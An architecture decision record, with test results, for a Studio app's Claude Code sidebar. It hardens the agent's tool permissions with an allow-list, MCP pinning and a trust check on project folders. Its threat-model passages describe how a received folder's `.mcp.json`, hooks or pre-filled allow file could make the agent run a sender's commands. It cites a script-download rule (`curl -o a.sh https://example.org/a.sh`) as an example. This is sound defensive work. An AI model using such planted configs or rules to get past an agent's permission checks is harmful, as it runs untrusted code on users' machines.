# ADR 0134: Wave 48E, the Claude Code sidebar in the Studio (`rcfd-claude` in the UI)

Status: **ACCEPTED 2026-10-28** (the maintainer accepted the ADR and took the recommended option of every open decision W48-1 to W48-16, scope cut (a)) (scoping only; nothing implemented or run). Library part (`rcfd-claude` additions) can start at once;
integration needs ADR 0131 (48B). House rules as in ADR 0130. Parent: plan sections 2, 3 (L6), 7 and 8. Roadmap: F-266, F-265.

User decisions that this ADR does not reopen (plan section 8, 2026-10-26): (1) the sidebar may type into a Claude Code session that is
closed, by resuming it with `claude -p --resume`, and only mirrors a session that another process has open; (2) tool approvals use a
conservative allow-list first, with no Agent SDK sidecar and no auto-approval of everything.

## Context (read at main 1248a76)

* `rcfd-claude` (ADR 0126, fixes in ADR 0128): `Claude::discover(project)` gives sessions OPEN, CLOSED or UNKNOWN
  (`crates/rcfd-claude/src/driver.rs` line 119); `new_session` and `resume` spawn `claude -p` per message with the prompt on stdin and
  return a `Chat` that streams `StreamEvent`s over a channel and cancels without orphans (lines 151, 157, 361-384); `resume` refuses an
  open session (`Error::SessionOpen`) or an unknown state (`OpenStateUnknown`); `transcript::tail` and `read_new` follow a transcript.
* Allow-list (`src/allow.rs`): every chat gets `--permission-mode dontAsk --permission-prompts none` plus one `--allowedTools` value
  per rule; `check_args` refuses `--settings`, `--permission-prompt-tool`, `--add-dir` and bypass tokens; `suggest` gives the narrowest
  exact rule for a denied call; control files (`.mcp.json`, `CLAUDE.md`, `.claude/**`, `.rcfd/**`, `rcfd-project.json`) are refused.
  The list lives in memory only; nothing persists it.
* `AllowRule::Tool` accepts only ASCII letters, digits and `_` (`allow.rs` line 137).
* Read in the Claude Code documentation on 2026-10-28 (code.claude.com/docs/en/headless, /mcp; not observed on 2.1.310):
  non-bare `claude -p` loads installed plugins and a project's `.mcp.json` servers, and in `-p` runs project-scoped servers load
  without asking; `--mcp-config` works in `-p`; `--bare` skips hooks, skills, plugins, MCP servers and CLAUDE.md. Plugin MCP tools are
  named `mcp__plugin_<plugin>_<server>__<tool>`, other servers `mcp__<server>__<tool>`; hyphens are kept in names.
* Consequence of the last two points: a project folder received from someone else, holding a `.mcp.json` or `.claude/settings*.json`
  with hooks, makes the sidebar's `claude -p` run commands from that folder when the user types a message. The allow-list cannot
  prevent this: the files are there before the chat starts, and MCP servers start before any tool call.
* Observed limits from ADR 0126 that the UI must show honestly: the CLI approves some read-only shell commands itself; user and
  project settings add rules; the gap between the open check and the spawn is not covered.

## Decisions needed

### W48-10: project-folder files that change what `claude -p` runs

* (a) **Pin MCP servers.** Every chat passes `--strict-mcp-config --mcp-config <app-owned file>` naming only the rcfd project server
  (ADR 0135). Needs an additive change to `check_args`: these two flags are allowed only in that form, with the config path outside the
  project folder (in the Studio's config directory). Covers `.mcp.json`; does not cover hooks in `.claude/settings*.json`
  (UNVERIFIED whether a flag limits setting sources in `-p`; not relied on). Under strict mode the sidebar's server is a non-plugin
  server from the app-owned file, so its tools are named `mcp__<server>__<tool>`; the app names that server `rcfd_project` (no hyphen,
  so `AllowRule::Tool` accepts the names). Whether `--strict-mcp-config` also drops plugin-provided servers is UNVERIFIED; the sidebar
  does not rely on the plugin either way.
* (b) **Confirm the folder.** Before the first chat in a project, the Studio lists the files that change Claude Code's behaviour
  (`.mcp.json`, `.claude/`, `CLAUDE.md` at any depth, `.claude-plugin/`) with their hashes and starts a chat only after the user
  confirms them; the confirmed hashes go into `.rcfd/claude-trust.json`; any later change asks again.
* (c) **Document only**: state the risk in the tutorial and do nothing in code.

Trade-offs: (a) also stops the sidebar from using the user's other MCP servers in that chat, which may surprise; (b) adds one dialog
per new folder and per change; (c) leaves a known way to run code from a received folder. **Recommendation: (b) and (a) together**:
(b) covers hooks and CLAUDE.md, (a) makes the server set exactly the one the app intends. If the user wants other MCP servers in the
sidebar, (a) can list them in the app-owned file.

### W48-11: where the allow-list lives and what it holds at first

* (a) Per project, `.rcfd/claude-allow.json` (rules as their flag values, re-validated on load by `AllowRule::parse`; an invalid line
  is refused with a located message and not passed). `.rcfd/` is a control path the allow-list itself refuses, so Claude cannot edit
  it. First contents: the read-class project tools of ADR 0135, nothing else, under the name form that W48-10 decides: with (a),
  `Tool(mcp__rcfd_project__<tool>)` (the app-owned server); without (a), `Tool(mcp__plugin_rcfd_project__<tool>)` (the plugin's
  server, if the user has installed it).
* (b) Per user, in the Studio's config directory, shared by all projects.
* (c) Per project as (a) but empty at first.

Trade-offs: (b) carries a rule allowed for one project into every other; (c) makes the first chat deny every project tool until the
user clicks "allow" for each. **Recommendation: (a)**.

Naming consequence (any option): the plugin and its server must be named without hyphens (ADR 0135 names them `rcfd` and `project`),
or `AllowRule::Tool` must be widened to accept `-`. The first is preferred: it keeps the validator unchanged.

## Design (proposed, assuming the recommendations)

* **Session list**: `Claude::discover` on a worker every 2 s, shown as open (mirror, input disabled, with the pid), closed (input
  enabled) or unknown (input disabled, reason shown). A "new chat" button starts `new_session`.
* **Mirror**: `transcript::tail(50)` then `read_new` every 500 ms; role, text, tool names, timestamps only.
* **Send**: a closed session is resumed with the prompt; a new session gets its id from `new_session`. One `Chat` at a time per
  session; the input is disabled while a turn runs; cancel calls `Chat::cancel`.
* **Approvals**: a `PermissionDenied` event shows the tool, its input (from the matching tool call) and the suggested rule; "allow"
  adds exactly that rule to the file and says it applies from the next message (`-p` is one process per message). Rules can be removed.
  The panel states the floor caveat of ADR 0126 (CLI and settings may allow more).
* **Costs**: `total_cost_usd` of each result is shown per turn and summed per session.
* **Claude Code missing**: `Claude::from_env()` none: the panel says so and how to install; the rest of the app works.

## Placement

`rcfd-studio -> rcfd-claude`. `rcfd-claude` gets additive API: allow-list load and save (`AllowList::from_file`, `to_file`), the
folder control-file scan, and the W48-10 (a) flags in `chat_args` and `check_args`. The file writes use `rcfd_project::atomic`, so
`rcfd-claude` gains the edge `rcfd-claude -> rcfd-project` and moves from layer 0 to layer 2 (with `rcfd-runner`) in
`workspace_graph.rs` and `docs/architecture.md`; this avoids another copy of the atomic-write code that ADR 0128 finding 16b lists as
debt, and the graph stays acyclic (`rcfd-project` depends on `rcfd-core` only). It also lets the ADR 0128 finding 10 tests of both
sides become one test. No new third-party dependency.

## Registered checks (proposal; all with `fake-claude`, never the real CLI)

| Id | Check | Limit | Reason | Negative control |
|---|---|---|---|---|
| E1 | Session list on the D7 fixture home of ADR 0126 | the panel model shows exactly S2 open (input disabled), S1 closed (enabled), S3 open; listing failure: unknown, disabled, warning | user decision 1 | the colliding transcript is excluded |
| E2 | Typing into an open session | refused in the model; no process started (the fake records no argv) | one writer | a closed session in the same fixture starts exactly one process |
| E3 | Resume a closed session | the fake's argv equals `Chat::args`; the turn text assembled from deltas equals the result text; cost shown | ADR 0126 D1 | (D4 pattern: an init in another mode aborts and is shown as aborted) |
| E4 | Denial and "allow": the call-5 stream | suggestion `Edit(other.txt)` shown; "allow" grows the file by exactly one rule; the next argv has it and still starts with `--permission-mode dontAsk --permission-prompts none` | ADR 0126 D3, D4 | a suggestion for `.mcp.json` is `None` and no button is shown |
| E5 | Allow-list file | round trip exact; a tampered file with `Bash` (bare), a bypass token or `Edit(.rcfd/x)` is refused with the line number; nothing from it is passed | ADR 0126 T2, ADR 0128 finding 2 | a valid file is accepted |
| E6 | Cancel a long turn from the panel | both pids gone within 5 s | ADR 0126 D5 | (D6) |
| E7 | Mirror a transcript being written | appended messages appear within 2.0 s; a partial line only once completed | 4 poll periods | the whole-file reader shows the partial line |
| E8 | Folder control files (W48-10 (b)) | a project with `.mcp.json`, `.claude/settings.json` or a nested `CLAUDE.md`: no chat process until confirmed; after confirmation one; a changed hash asks again | the docs finding above | a project without those files starts at once |
| E9 | MCP pinning (W48-10 (a)) | argv contains `--strict-mcp-config --mcp-config <path outside the project>`; `check_args` refuses the same flags with a path inside the project or without `--strict-mcp-config`; T3 of ADR 0126 still finds no forbidden argument in its generated space | additive to D2 of ADR 0126 | `--mcp-config ./.mcp.json` is refused |
| E10 | Panel frame build while a turn streams 30 000 events (ADR 0126 P4 stream) | median frame build <= 8 ms (release) | as ADR 0131 B7 | rendering the whole transcript as one text each frame exceeds 8 ms |

## Not in CI (need a real Claude Code session; run once each by hand, billable calls with `--model haiku`)

* H1: a session open in a terminal in the project folder is mirrored and refuses input; after the terminal closes, typing resumes it.
* H2: a denied Write, "allow", repeat: the Write succeeds.
* H3: with W48-10 (a), the chat lists only the rcfd project server (`system/init` `mcp_servers`).
* H4: cancel a long turn; no `claude.exe` or tool shell left in Task Manager.
* H5: the project tools are callable from the sidebar chat under the first allow-list, under the name form W48-10 decides.
These carry over ADR 0126's "Not observed" list; their results go into the addendum with the CLI version.

## Out of scope

Agent SDK sidecar; `--permission-prompt-tool`; cross-session messaging; Remote Control and `claude attach`; the IDE protocol; Claude
Code mods (they run inside Claude Code's process, plan section 7); provider-key assistants of the frozen GUI (F-145 path).

## Risks

* The transcript and stream formats are internal and change between versions (plan section 7). Fixtures pin 2.1.310; a newer CLI is
  read tolerantly (`Unrecognised`), and the panel shows the CLI version and a warning when it is not the pinned one.
* The open check and the spawn are not atomic (ADR 0126); two writers remain possible in that gap.
* The documented `-p` behaviour above was read, not observed; H3 is the first observation.

## Files

`crates/rcfd-claude/src/{allow,driver,lib}.rs` and a new `src/trust.rs`, new tests; `crates/rcfd-studio/src/chat*.rs` and tests;
this ADR.

## Amendment 1 (2026-10-28, library part, registered before the corrected run)

First registered run of the library checks (release, `target-w48e`, worktree at main 3492c75 plus the uncommitted library
code): E4, E9 and every ADR 0126 / 0128 test passed; **E5 failed**. The tampered rule inserted as line 6 was refused, but
reported at line 7, column 4. Cause, in the implementation and not in the test: the first version validated each rule
inside serde deserialization. serde_json gives such an error a position only after its end-of-array check has consumed the
following `,` and whitespace, so the position is that of the next element. Correction: the file is parsed first
(rules as strings), then each rule is validated and a refusal is located by a scan of the parsed text for the line and
column of that array element (`allow::rule_positions`). The E5 limit ("refused with the line number") and the test are
unchanged; the corrected run follows this amendment. (This text was written into the file before the corrected run but
committed afterwards, in the addendum commit 9e870cc.) The rule that a missed limit becomes a `*_known_miss` test was not
applied, because the miss was a defect in new code, not a limit that the code cannot meet; the maintainer is asked to
confirm this or have it converted.

## Addendum: library part, results against the registered limits (2026-10-28)

Branch `worktree-agent-a99d9f825a90b2d6c` on main 3492c75. Commits: 0a3a2ac (edge `rcfd-claude -> rcfd-project`, layer 2 in
`workspace_graph.rs` and `docs/architecture.md`), 16fa6f5 (allow-list file, first list, MCP pinning), 50d6264 (tests),
cb92479 (control-file scan). Runs: `cargo test --release -p rcfd-claude -- --nocapture` with `CARGO_TARGET_DIR=target-w48e`,
`CARGO_BUILD_JOBS=2`, Windows 11; clippy `-p rcfd-claude --all-targets -D warnings` clean before each run. Run 1 is described in
Amendment 1; run 2 (the corrected run, code of 50d6264) and run 3 (cb92479, adds the scan) passed every test.

What was built (additive; `Claude::new` and `check_args` give the same results as before):
* `allow::ALLOW_FILE` (`.rcfd/claude-allow.json`), `AllowList::{from_file, to_file, from_file_bytes, to_file_bytes, file_of,
  project_initial}`. The file is `{"version": 1, "rules": [<flag values>]}`, one rule per line, written with
  `rcfd_project::atomic::atomic_write` (its folder is created). On load every rule goes through the policy of
  `AllowList::add`; one bad rule, an unknown key, another version or broken JSON refuses the whole file
  (`Error::AllowFile` with line and column). `./` anchors are normalised so a list read back equals the list written.
* `project_initial()`: the 11 read-class tools of ADR 0135 as `mcp__rcfd_project__<tool>` (`allow::PINNED_SERVER`
  = `rcfd_project`), nothing else.
* `Claude::mcp_config: Option<PathBuf>` (`None` from `Claude::new`): when set, `chat_args` puts
  `--strict-mcp-config --mcp-config <file>` before the permission flags. `allow::check_args_in(args, project)` = `check_args` plus:
  each flag at most once and only in that spelling (no `=` form); `--mcp-config` only with `--strict-mcp-config` and
  exactly one value; the value must be an absolute path of an existing file outside the project, both lexically and after
  `rcfd_project::paths::canonicalize`; inline JSON is refused. Every spawn now runs `check_args_in`. `allow::pinned_mcp_config`
  writes the app-owned config text (one stdio server, `rcfd-mcp --project <dir> --root <dir>`).
* `trust::scan(project)`: `.mcp.json`, `CLAUDE.md`, and everything under `.claude/` or `.claude-plugin/`, at any depth, in any
  ASCII case, with `fnv64` hashes; links are listed and never followed; an unreadable folder is an error. This is not a gate:
  see the open question below.

| Check | Part | Limit | Result |
|---|---|---|---|
| E1 | integration | panel model of the session list | not run (needs the 48B panel model) |
| E2 | integration | open session refused in the model, no process | not run (panel model); the library refusal is ADR 0126 D2, passes unchanged |
| E3 | integration | resume, argv, text, cost shown | not run (panel); library side is ADR 0126 D1-D4, passes unchanged |
| E4 | library: file and argv | suggestion `Edit(other.txt)`; file +1 rule; next argv has it and `--permission-mode dontAsk --permission-prompts none` after the fixed flags; `.mcp.json` suggestion `None` | **pass**: `Edit(./other.txt)`; file 12 -> 13 rules; argv rules 12 -> 13, permission flags at positions 7-10 (once); `.mcp.json` -> `None`. "Shown" and the button: not run (panel) |
| E5 | library | exact round trip; bare `Bash`, a bypass token, `Edit(.rcfd/x)` refused with the line number; nothing passed; valid file accepted | **pass** (run 2, after Amendment 1): round trip equal and byte-identical on rewrite; the 3 tampered files refused at line 6 (the inserted line); `from_file` returns no list; the valid file is accepted. Not registered, also refused: two rules on one line (line 6), version 2 (line 2), unknown key (line 2), truncated JSON |
| E6 | integration | cancel from the panel | not run (panel); ADR 0126 D5: both pids gone 0.527 s after cancel started (run 2) |
| E7 | integration | mirror within 2.0 s | not run (panel); ADR 0126 P3 passes unchanged |
| E8 | library + integration | no chat until the folder is confirmed | **not run: blocked by the open question below**; only the scan exists, with unregistered tests |
| E9 | library | argv has `--strict-mcp-config --mcp-config <outside>`; refused inside or without `--strict-mcp-config`; T3 space clean; `--mcp-config ./.mcp.json` refused | **pass, against `check_args_in`** (the limit names `check_args`, which has no project path and keeps its ADR 0126 behaviour: alone it still accepts these flags; every spawn runs `check_args_in`): recorded argv equals `Chat::args` and has the triple once; 14 refusals on Windows (relative `./.mcp.json`, `.mcp.json`, `../x`; absolute inside; lexically inside through `sub/..`; other ASCII case; no `--strict-mcp-config`; inline JSON; both `=` forms; two values; flag twice; no value; missing file); accepted: sibling `my-proj2`, the config through `<proj>/..`, `--strict-mcp-config` alone; a config inside the project starts no process; T3 space with pinning 7469 lists (10 203 distinct rules), none refused or carrying a bypass token; T3's 15 bad lists still refused; ADR 0126 T3 itself unchanged and passing. Not registered: a link outside pointing into the project is refused |
| E10 | integration | frame build <= 8 ms | not run (panel) |
| H1-H5 | by hand | real Claude Code session | not run (need a real session and a person) |

ADR 0126 and 0128 tests: all pass unchanged (lib 10 + 2 new scan tests, `driver_fake` 7, `driver_init_wfix` 2,
`fixtures_v2_1_310` 6, `real_cli` 3 ignored).

Deviations:
* Amendment 1: the first run failed E5 because of a wrong line from the implementation; fixed and re-run as registered.
* `cargo fmt --all` fails on this machine with "The filename or extension is too long (os error 206)"; `cargo fmt -p rcfd-claude`
  was used.
* `crates/rcfd-cli/tests/workspace_graph.rs` was edited (rcfd-claude at layer 2) but not run: the run was limited to
  `-p rcfd-claude`. `cargo metadata` shows the only new edge is `rcfd-claude -> rcfd-project` (layer 1) and that no crate
  depends on `rcfd-claude`. ADR 0130 48A edits the same table line (rcfd-runner), so the two branches conflict there.
* Dependencies: no new third-party crate (Cargo.lock adds no package). Direct dependencies added: `serde` (workspace, already
  in the tree through `serde_json`) and `rcfd-project` (path).
* API: the new `Error::AllowFile` variant and the public field `Claude::mcp_config` break exhaustive matches and struct
  literals outside the crate; there are no such users today.
* Not done: merging the ADR 0128 finding 10 tests of both crates into one (the ADR says the edge makes it possible; removing a
  test is not additive).

**Open question (blocks E8 and the gate; not decided here).** W48-10 (b) keeps the confirmed hashes in `.rcfd/claude-trust.json`,
inside the project. A folder received from someone else can ship that file already holding the right hashes of its own
`.mcp.json` and hooks, so the chat would start without a confirmation. The same holds for `.rcfd/claude-allow.json`: a received
folder can pre-approve rules the user never saw (for example `Bash(curl -o a.sh https://example.org/a.sh)`, which the policy
accepts). `.rcfd/` being a control path only stops Claude from editing these files, not the sender. Options:
* (a) keep the trust record in the Studio's config folder, keyed by the canonical project path; ignore any record in the folder;
* (b) keep `.rcfd/claude-trust.json` but require a matching per-user record (or a per-user secret) as well;
* (c) in addition to (a) or (b), list `.rcfd/claude-allow.json` with the control files, so a received list is confirmed
  before its first use (the Studio updates the record when the user clicks "allow").
Related points for the same decision: `fnv64` is not collision-resistant, so someone who controls a later update of the folder
(for example through `git pull`) can make a changed file keep its hash; a cryptographic hash would need a new crate (for
example `sha2`, MIT/Apache-2.0). The ADR list leaves out `CLAUDE.local.md` and `CLAUDE.md` files in folders above the project,
which Claude Code also reads according to its memory documentation (from prior reading, not re-read for this addendum,
not observed). `check_args_in` does not refuse `--plugin-dir` and similar flags,
because the ADR does not list them; the driver never generates them. Should `check_args` itself also refuse the
project-independent MCP forms (relative path, inline JSON, `=` forms, several values, `--mcp-config` without
`--strict-mcp-config`)? It was left unchanged so that existing callers get the same verdicts. The outside-the-project check
compares paths lexically and after `canonicalize`; it does not detect hard links or UNC aliases (`\\localhost\E$\...`) of a file
in the project. The Studio chooses the config path, so this is a stated limit, not a hole a received folder can use.

## Amendment 2 (2026-10-28, maintainer decisions after the library addendum; registered before the E8 run)

Maintainer decisions (user-approved, from the main session): the trust record follows option **(a) + (c)** of the open question
above. It is kept in the Studio's per-user config folder, keyed by the canonical project path, never inside the project folder
(a `.rcfd/claude-trust.json` found in a project is ignored). `.rcfd/claude-allow.json` is listed among the files the user
confirms, with its rules shown. `new_session` and `resume` refuse an unconfirmed or changed folder. Still open, unchanged:
`fnv64` against a cryptographic hash (no `sha2` added), whether `check_args` itself refuses the MCP forms (left as is), and
how the E5 rerun is treated (the code fix is kept).

Design of the library part (`src/trust.rs`, `src/driver.rs`):
* `trust::scan` also lists `.rcfd/claude-allow.json` (ASCII case and trailing dots ignored).
* `TrustStore::new(<file in the Studio config folder>)`: JSON `{"version": 1, "projects": {<canonical path>: [entries]}}`,
  written atomically. `check(project)` gives `Confirmed` or `Pending { files, changed, allow_rules }`: `changed` names every
  path added, changed or removed since the record; `allow_rules` holds the allow file's rules as flag values, or why the file
  is refused. A folder whose scan is empty is confirmed without a record (starts at once). `confirm(project, files)` records
  the files the user was shown. `save_allow_list(project, list)` writes the allow file and updates only that file's entry
  (the "allow" button), so other unconfirmed files still ask.
* `Claude::trust_store: Option<PathBuf>` (`None` from `Claude::new`). `new_session` and `resume` check the folder first, after
  the argument checks and before any process starts (for `resume` also before `claude agents --json`), and return
  `Error::FolderNotConfirmed { project, pending }`. With no store, only a folder without control files can start.
  Existing callers whose folders hold no control file are unaffected; a caller that used to start chats in a folder with
  `.mcp.json`, `.claude/`, `CLAUDE.md`, `.claude-plugin/` or an allow file is now refused until it confirms (decided above).

E8 set-up (`tests/w48e_trust.rs::e8_*`, `fake-claude`, store at `<tmp>/studio-config/claude-trust.json`, outside the project):
for each of three projects holding `.mcp.json`, `.claude/settings.json` or `cases/sub/CLAUDE.md`: `new_session` and `resume`
are refused with `FolderNotConfirmed` naming that file and the fake records no call at all; after `confirm` with the pending
files, `new_session` starts exactly one chat process; after one byte of the file changes, `new_session` is refused again with
the file in `changed` and the call count stays at one. Negative control: a project without those files starts at once (one
process, no store needed). Extra cases on the same set-up, under the same rule (no process while refused, one after):
* a project with `.rcfd/claude-allow.json`: pending shows its rules exactly; after confirming, `save_allow_list` with one more
  rule does not ask again, while a direct write of the file does;
* a sender's record shipped inside the project (`.rcfd/claude-trust.json` holding the right hashes in the store format) does
  not confirm the folder;
* a confirmed folder copied to another path is not confirmed there.

E4 set-up change (limits unchanged): the E4 project holds `.rcfd/claude-allow.json`, so under the decisions above it must be
confirmed before its first chat. The test sets `Claude::trust_store`, confirms the folder after writing the first list, and
writes the grown list with `TrustStore::save_allow_list` (the "allow" button) instead of `AllowList::to_file`.

## Addendum 2: E8 and the trust record, results (2026-10-28)

Branch `worktree-agent-a99d9f825a90b2d6c` rebased onto main 15b00ef (48A, 48C and 48E library merged). Commits: fd6458c
(Amendment 2, registered before any run), d04c7f8 (trust record and gate), c1ea451 (E8 tests, E4 set-up change). One release
run at c1ea451 (`cargo test --release -p rcfd-claude -- --nocapture`, `target-w48e`, `CARGO_BUILD_JOBS=2`, Windows 11), clippy
`-D warnings` clean before it. Every test passed on this first run; no further amendment.

| Check | Limit | Result |
|---|---|---|
| E8 | `.mcp.json`, `.claude/settings.json` or nested `CLAUDE.md`: no chat process until confirmed; one after; a changed hash asks again; a project without those files starts at once | **pass**: for each of the three, `new_session` and `resume` returned `FolderNotConfirmed` naming the file and the fake recorded 0 calls (no `claude agents --json` either); after `confirm`, 1 chat process; after one byte changed, both refused again with the file in `changed`, still 1 process. Control: a project without control files started at once, with and without a store (2 processes, no record written) |
| E8 extra (allow file, option (c)) | same rule | pass: pending shows the file's 12 rules exactly; after confirming, `save_allow_list` with one more rule kept the folder confirmed (chat started); a direct write asked again; a tampered file is shown with its refusal (line 1) and nothing started |
| E8 extra (shipped record, copy) | same rule | pass: a `.rcfd/claude-trust.json` shipped in the folder with the right hashes for that exact path confirms nothing; a store pointed into the project is refused (`Error::Io`, "inside the project folder") and `confirm` into it fails; a confirmed folder copied to another path is not confirmed there; 0 processes in each case |
| E4 (set-up of Amendment 2) | unchanged | pass, same values as before: `Edit(./other.txt)`; file 12 -> 13; argv rules 12 -> 13 |
| E5, E9, E0, ADR 0126 / 0128 tests | unchanged | pass (lib 12, `driver_fake` 7, `driver_init_wfix` 2, `fixtures_v2_1_310` 6, `w48e_library` 5, `w48e_trust` 3; `real_cli` 3 ignored); D5 0.634 s |

API added: `trust::{TrustStore, TrustState, Pending, check_folder, is_allow_file}`, `Claude::trust_store`,
`Claude::check_folder`, `Error::FolderNotConfirmed`. Behaviour change (decided): `new_session` and `resume` now refuse a folder
holding unconfirmed control files, also for callers that set no store. Each message now scans the whole project folder (no
directory is skipped; cost not measured on a large project).

Still open (Amendment 2): `fnv64` against a cryptographic hash; whether `check_args` itself refuses the MCP forms; the
treatment of the E5 rerun (code fix kept). Also open from the first addendum: `CLAUDE.local.md` and `CLAUDE.md` above the
project are not scanned; `--plugin-dir` is not refused. Stated limits: the store is replaced without a lock (two Studio
processes confirming at once can lose one confirmation, which then asks again); the gap between the folder check and the
spawn is not covered, as for the open check (ADR 0126).

## Amendment 3 (2026-10-28, integration part, registered before any panel check ran)

Written by the 48E integration implementer on main 7486ecb (48A, 48B, 48C library, 48D, 48E library and 48F merged). What I
knew: the code reading, the library results above and a compile of the new code; no panel test had run. The limits of E1-E10
are unchanged. The maintainer's decisions applied: W48-10 (a) and (b), W48-11 (a), Amendment 2 (trust record per user,
outside the project, the allow file confirmed with its rules), `fnv64` kept.

**Design as built** (`crates/rcfd-studio/src/chat.rs`: model, worker and turn threads; `src/chat_ui.rs`: drawing and the
confirmation dialog; hooks: the `Studio::chat` field, opened with the browser's root on `Event::Opened`, closed in
`close_project`, drained in `Studio::drain`; the `Panel::Chat` arm and one dialog call in `ui.rs`; the bridge set in
`main.rs`).
1. The chat is off unless a bridge is set: `Studio::new` and `Studio::in_memory` start no process (B1-B9 and R1-R12 are
   untouched by it). `main` sets `Bridge::from_env(config_dir())`, which needs the Studio's config folder, Claude Code's home
   (`Claude::from_env`) and `claude.exe` (Windows; `claude` elsewhere) on PATH; otherwise the panel says why, and how to
   install, and the rest of the Studio works. `rcfd-mcp` is taken from `RCFD_MCP_BIN`, else next to the Studio binary.
2. Per-user files, both in the config folder, never in the project: the trust record `claude-trust.json`
   (`Claude::trust_store`), and the app-owned MCP config `claude-mcp/<fnv64 hex of the project path>.json`
   (`Claude::mcp_config`), written by the chat worker with `allow::pinned_mcp_config` when the project opens. Without a config
   folder neither can exist, so the chat is off (W48-10 (a) cannot be applied without it).
3. Allow-list: read on the turn thread just before each spawn; a missing file means `AllowList::project_initial()` (the 11
   read-class project tools). The file is first written when the user clicks "Allow", "remove" or "Reset to the first list",
   always through `TrustStore::save_allow_list`. Opening a project writes nothing into it.
4. Sessions: `Claude::discover` every 2 s on a thread of the chat worker. OPEN: input disabled with the pid and the reason;
   CLOSED: enabled; UNKNOWN: disabled. A pid of this Studio's own turn counts as closed, so a listing taken during the turn
   does not block the next message.
5. Send: refused in the model from its cached state, with no process and no listing, when the bridge is off, no project is
   open, a turn runs, the MCP config is not written, the folder is pending or unreadable, the allow file is refused, or the
   selected session is OPEN, UNKNOWN or no longer listed. Otherwise a turn thread calls `Claude::resume` or
   `Claude::new_session`, which check the arguments, the folder and (for resume) the open state again before any process.
   A refusal with `FolderNotConfirmed` opens the dialog with that `Pending`.
6. Mirror: on selection the last 50 entries (read from the end; the offset is set after the last complete line), then
   `transcript::read_new` every 500 ms. During this Studio's own turn in that session the mirror pauses (the turn is shown
   from its stream); after the turn the transcript's lines replace the stream's items when they arrive.
7. Turn: text assembled from the deltas, tool calls, denials with their input (from the matching tool call) and the
   driver's suggestion, cost of the result (summed per session over the turns run here); after `Aborted` only the exit is
   applied. Cancel sets a flag that the turn thread checks every 20 ms and then calls `Chat::cancel`.
8. Transcript area: items hard-wrapped (greedy word wrap) at the panel width in monospace characters, drawn with
   `ScrollArea::show_rows`; appending text redoes only the last row; at most the last 10 denials are listed.
9. The CLI version of `system/init` is shown, with a warning when it is not 2.1.310 (Risks). The floor caveat of ADR 0126 is
   shown with the allow-list. A model field passes `--model` (empty: the user's default); `--model haiku` is how H1-H5 are
   meant to be run.
10. Confirmation dialog (`egui::Modal`, nothing behind it can be clicked): the project path; per file its path (links
    marked), size, hash and "new or changed"; the paths removed since the last confirmation; the allow file's rules or why
    it is refused; the first 4 KiB of each file, marked when it changed after the list was made. "Confirm these files"
    records `Pending::files` with `TrustStore::confirm` on the worker and checks again; "Not now" closes it.

**Set-up of the checks** (`crates/rcfd-studio/tests/chat_e.rs`, `tests/chat_common/mod.rs`; release, `--test-threads 1`):
1. The replay double is `fake-claude` of `rcfd-claude`, built by `cargo build --release -p rcfd-claude --bin fake-claude`
   into the same target folder and found next to the `rcfd-studio` binary (the 48D pattern for `rcfd-runner`); a missing
   double fails the test. Its fixtures are read in place from `crates/rcfd-claude/tests/fixtures/v2.1.310`. The fake
   records `agents --json` calls as well, so "no process" is counted as recorded `-p` calls.
2. Common set-up: a project made by `Project::create` at `<tmp>/my-proj` (canonical path), Claude Code home `<tmp>/home`,
   config folder `<tmp>/studio-config` (outside the project); `Studio::in_memory` with the watcher and run worker off and
   the bridge set to the fake; drained until the project is open, the MCP config written, the allow-list read, the first
   discovery and the first folder check received. "Shown" means present in the text shapes of a headless frame of the
   whole app (1280 x 800, the case editor hidden so that Chat is the visible tab of its area; the 4th frame).
3. E1: the D7 fixture of ADR 0126 (S2 open with this test's pid, S1 with a dead pid, S3 open without a transcript, a
   non-UUID id, S4's transcript of the colliding folder `my_proj`). Limit: rows exactly S2 (disabled), S1 (enabled), S3
   (disabled), drawn "open in process <pid> (mirror only)" and "closed"; then the fake's listing fails, a refresh: S2 and
   S1 unknown and disabled, a warning naming `claude agents --json` (drawn), "state unknown" drawn, sending to S1 refused.
   Control: S4's file is in the directory and not listed.
4. E2: the same fixture. Selecting S2 and sending is refused in the model ("open in process"), no turn exists, and 1 s
   later no `-p` call is recorded. Control: S1 with the dontAsk stream (its session id set to S1) starts exactly one `-p`
   process, which finishes with exit code 0.
5. E3: an empty listing and S2's transcript (S2 closed). The stream is `stream_allowlist_dontask.jsonl`: the only recorded
   dontAsk stream with text deltas (`stream_resume.jsonl` reports mode `default`, which the driver aborts). Limit: one `-p`
   call whose argument list equals `Chat::args` (forwarded by the turn), ends in `--resume S2` and has
   `--strict-mcp-config --mcp-config <a file outside the project>`; the text from the deltas equals the result text and the
   recorded string; cost 0.00381852; drawn "cost $0.003819" and "session total here $0.003819". Control (D4 set-up):
   `stream_denied_default.jsonl` with `hang`: the turn is `Aborted` naming `dontAsk`, the feed has the note, "aborted: the CLI
   did not apply --permission-mode dontAsk" is drawn, and both fake pids are gone within 5 s.
6. E4, panel part (the library part passed above): the call-5 stream `stream_denied_dontask.jsonl`, no allow file at
   first. Limit: the denial is drawn with `Edit(./other.txt)` and an "Allow" button, its input names `other.txt`, the
   suggestion is `Edit(other.txt)`; `ChatModel::allow_rule` (what the button calls) creates the file with the first list
   plus that rule (11 -> 12), the folder stays confirmed; the next message's argument list has exactly one rule more, and
   the four permission flags before `--allowedTools`. Control: the same stream with `other.txt` replaced by `.mcp.json`:
   suggestion `None`, "no rule can allow this call" drawn, no "Allow" button.
7. E6 (D5 set-up): `stream_allowlist_dontask.jsonl` with `hang` and a pid file, a new chat; both pids alive 300 ms after
   the turn runs; `ChatModel::cancel` (what the Cancel button calls); limit: both gone within 5 s; the turn ends
   `Cancelled`. The D6 control is the library's (ADR 0126), not re-run.
8. E7: S2 open (this test's pid) with its transcript; S2 selected (mirror only) and its tail shown. A complete user line
   "E7 marker 1" is appended: limit, in the model's feed within 2.0 s of the append. The first half of a second marker line
   is appended: the feed does not change for 2.0 s (4 periods); the line is completed: in the feed within 2.0 s, exactly
   once, and no unrecognised item. Control: `Switches::whole_file_mirror` (the whole file each period, the unterminated
   last line included) shows the partial line as an unrecognised item within 5 s.
9. E10: release only (a debug run prints a located SKIP, as B7). The P4 stream of ADR 0126 (1000 copies of the call-3
   stream, 34 000 events: the table's "30 000"), parsed by `stream::parse_line` and fed through `ChatModel::apply` after
   one `Started` (the driver would abort this default-mode stream; the panel's cost is measured, not the driver's), in 100
   equal chunks: each timed frame is one chunk applied plus one frame of the whole app (project open, discovery running).
   5 warm-up frames; limit: the median wall time of the 100 frames <= 8 ms. Control: `Switches::whole_text` draws the whole
   feed as one label each frame: median > 8 ms.
